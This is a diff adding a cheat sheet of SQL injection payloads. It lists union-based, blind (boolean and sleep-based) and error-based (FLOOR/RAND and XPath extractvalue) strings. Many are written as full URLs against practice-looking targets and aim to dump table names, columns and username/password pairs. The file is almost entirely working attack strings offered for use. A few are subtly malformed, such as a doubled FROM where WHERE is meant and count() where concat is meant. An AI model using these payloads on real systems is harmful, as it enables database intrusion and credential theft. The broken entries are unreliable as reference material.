@@ -1,0 +1,66 @@
+SQL PAYLOAD:
+   
+1' order by 100 -- 
+1' order by 1 #
+1' order by 1 --+
+1' union select 1,2,group_concat(table_name),4 from information_schema.tables from table_schema=database() -- 
+1' union select 1,2,group_concat(column_name),4 from information_schema.columns from table_name='user' -- 
+1' union select 1,2,group_concat(username,password),4 from user -- 
+nummw', (SELECT database())) -- 
+
+
+Blind sql payload:
+Iron Man' and 1=1 #
+Iron Man' and 1=1 and sleep(10) #
+Iron Man' and  substring(database(),1,1)='b' #
+Iron Man' and  substring(database(),2,1)='b' #
+Iron Man' and  length(database())=3#
+Iron Man' and  length(version())=5#
+
+Error based SQL injection:
+database version:
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);--+
+
+database name:
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);--+
+
+tables:
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT table_name from information_schema.tables where table_schema='acuart' limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);--+
+
+columns:
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT column_name from information_schema.columns where table_name='artists' limit 1,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);--+
+
+
+dump column data:
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT aname from artists  limit 1,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y);--+
+
+Error based using Xpath:
+get database:
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--
+
+get tables:
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--
+
+get column
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))--
+
+dumping data:
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--
+
+resources:http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html
+
+
+
+
+
+
+
+
